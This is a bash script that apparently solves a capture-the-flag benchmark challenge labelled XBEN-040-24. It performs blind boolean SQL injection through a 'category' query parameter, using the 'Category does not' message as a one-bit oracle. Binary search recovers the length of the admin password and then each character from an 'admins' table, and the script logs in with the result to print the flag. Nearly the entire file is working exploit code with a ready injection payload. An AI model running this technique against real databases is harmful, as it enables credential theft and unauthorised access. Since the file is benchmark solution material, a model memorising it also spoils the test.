#!/usr/bin/env bash
# XBEN-040-24 — blind boolean SQL injection, exfiltrated by binary search.
# Proxy-mode twin. The category filter is injectable; the page rendering (vs the
# "Category does not" message) is a one-bit oracle. Extract the admin password,
# then log in to read the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben040p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/index.php"
BASE="$(req_of GET index.php)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"

# One yes/no question: did the page render (yes) or report no category (no)?
ask() {
  # Grep the replay's own output (its body preview) rather than matching the
  # stored response: the "Category does not" message is early in the body, and
  # this does not depend on the exact body still being in the store.
  local out
  out="$("$H5I" websec replay "$BASE" --create --reset-budget --session "$SESSION" \
      --set "query.category=x' or ($1)#" 2>/dev/null)"
  ! grep -q 'Category does not' <<<"$out"
}

ask "1=1" && ! ask "1=2" || { echo "oracle does not answer: no injection" >&2; exit 1; }

low=0; high=128
while [ "$low" -lt "$high" ]; do
  m=$(((low+high)/2))
  if ask "(select length(password) from admins limit 1)>$m"; then low=$((m+1)); else high=$m; fi
done
length="$low"

password=''
for pos in $(seq 1 "$length"); do
  low=32; high=126
  while [ "$low" -lt "$high" ]; do
    m=$(((low+high)/2))
    if ask "(select ascii(mid(password,$pos,1)) from admins limit 1)>$m"; then low=$((m+1)); else high=$m; fi
  done
  password="$password$(printf "\\$(printf '%03o' "$low")")"
done

"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/admin.php' \
  --set 'form.username=admin' --set "form.password=$password" >/dev/null
print_flag
